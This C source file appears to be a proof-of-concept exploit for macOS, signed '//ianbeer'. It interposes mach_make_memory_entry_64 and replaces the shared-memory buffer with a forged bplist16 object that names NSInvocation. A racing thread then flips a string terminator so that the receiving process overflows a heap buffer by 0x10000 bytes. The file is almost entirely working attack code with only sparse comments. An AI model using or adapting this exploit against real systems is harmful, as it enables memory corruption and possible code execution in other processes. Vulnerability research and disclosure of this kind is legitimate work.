//ianbeer

#include <stdio.h>
#include <stdlib.h>
#include <dispatch/dispatch.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <mach/vm_map.h>

#include <pthread.h>

// this will be the malloc size overflowed out of
int initial_offset = 0x600;
int overflow_size = 0x10000;

void* flipper(void* arg) {
  //volatile char* first = ((char*)arg)+0x6c;
  //volatile char* second = ((char*)arg)+0x6d;
  volatile char* first = ((char*)arg)+initial_offset;
  volatile char* second = ((char*)arg)+initial_offset+1;

  while(1) {
    *first = 'A';
    *second = 'A';

    for (volatile int cnt = 0; cnt < 1000; cnt++);

    *first = '"';
    *second = 0;

    for (volatile int cnt = 0; cnt < 1000; cnt++);
  }
  return NULL;
}

// this is a dumped bplist16 serialization with the dictionary elements moved around
// so the 'ty' value is last
char fake_obj[] = {
0x62, 0x70, 0x6c, 0x69, 0x73, 0x74, 0x31, 0x36, 0xd0, 0x70, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00,
0x00, 0x74, 0x69, 0x6e, 0x76, 0x00, 0xd0, 0x70, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x77,
0x24, 0x63, 0x6c, 0x61, 0x73, 0x73, 0x00, 0x7d, 0x4e, 0x53, 0x49, 0x6e, 0x76, 0x6f, 0x63, 0x61,
0x74, 0x69, 0x6f, 0x6e, 0x00,


0x73, 0x73, 0x65, 0x00, 0x7f, 0x11, 0x25, 0x63, 0x61, 0x6e, 0x63, 0x65, 0x6c, 0x50, 0x65, 0x6e,
0x64, 0x69, 0x6e, 0x67, 0x52, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x57, 0x69, 0x74, 0x68, 0x54,
0x6f, 0x6b, 0x65, 0x6e, 0x3a, 0x72, 0x65, 0x70, 0x6c, 0x79, 0x3a, 0x00,

//0x73, 0x74, 0x79, 0x00, 0x76, 0x76, 0x40, 0x3a, 0x40, 0x40, 0x00, //sty typestring
0x73, 0x74, 0x79, 0x00, 0x76, 0x40, 0x00, //sty typestring

};

kern_return_t replacement_mach_make_memory_entry_64
(
	vm_map_t target_task,
	memory_object_size_t *size,
	memory_object_offset_t offset,
	vm_prot_t permission,
	mach_port_t *object_handle,
	mem_entry_name_port_t parent_entry
) {

  // is this the target call?
  uint8_t needle[] = {0, 0x41, 0, 0x41, 0, 0x41, 0, 0x41};
  if (!memmem((void*)offset, *size, needle, 8)){
    return mach_make_memory_entry_64(target_task, size, offset, permission, object_handle, parent_entry);
  }

	// make a copy of the object:
  mach_vm_address_t real_buf = 0;
  mach_vm_size_t real_size = *size;
  mach_vm_allocate(mach_task_self(), &real_buf, real_size, 1);

	memcpy((void*)real_buf, (void*)offset, real_size);

  // stick our fake object header at the start
  memcpy((void*)real_buf, fake_obj, sizeof(fake_obj));

  memset((void*)(real_buf+sizeof(fake_obj)), 'A', overflow_size);
  // add the longer termination
  *((char*)(real_buf+overflow_size)) = '"';
  *((char*)(real_buf+overflow_size+1)) = 0;

  // use a random string to prevent the signature string being cached so we can try multiple times
  sranddev();
  char sig[5];
  sig[0] = '"';
  sig[1] = 'A' + (rand()%26);
  sig[2] = 'A' + (rand()%26);
  sig[3] = 'A' + (rand()%26);
  sig[4] = 'A' + (rand()%26);

  memcpy((void*)real_buf+sizeof(fake_obj)-1, sig, 5);

  // put in the shorter termination which we'll flip
  *(((char*)real_buf)+initial_offset) = '"';
  *(((char*)real_buf)+initial_offset+1) = 0;

	// make our own memory entry:
	vm_prot_t flags = VM_PROT_DEFAULT;
  kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &real_size, real_buf, flags, object_handle, MACH_PORT_NULL);
  if (kr != KERN_SUCCESS) {
    printf("interposer failed to make memory entry\n");
    return MACH_PORT_NULL;
  } else {
    printf("interposer made memory entry!\n");
  }

	// map it:
  mach_vm_address_t mapped_buf = 0;
  kr = vm_map(mach_task_self(), (vm_address_t*)&mapped_buf, real_size, 0, 1, *object_handle, 0, 0, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);

  if (kr != KERN_SUCCESS) {
    printf("interposer failed to map memory entry\n");
    return MACH_PORT_NULL;
  } else {
    printf("interposer mapped memory entry!\n");
  }

	// spin up a thread to do the flipping
	pthread_t t;
  pthread_create(&t, NULL, flipper, (void*)mapped_buf);
	return KERN_SUCCESS;  
}

typedef struct interposer {
  void* replacement;
  void* original;
} interpose_t;

__attribute__((used)) static const interpose_t interposers[]
  __attribute__((section("__DATA, __interpose"))) =
    { {.replacement = (void*)replacement_mach_make_memory_entry_64, .original = (void*)mach_make_memory_entry_64}
    };

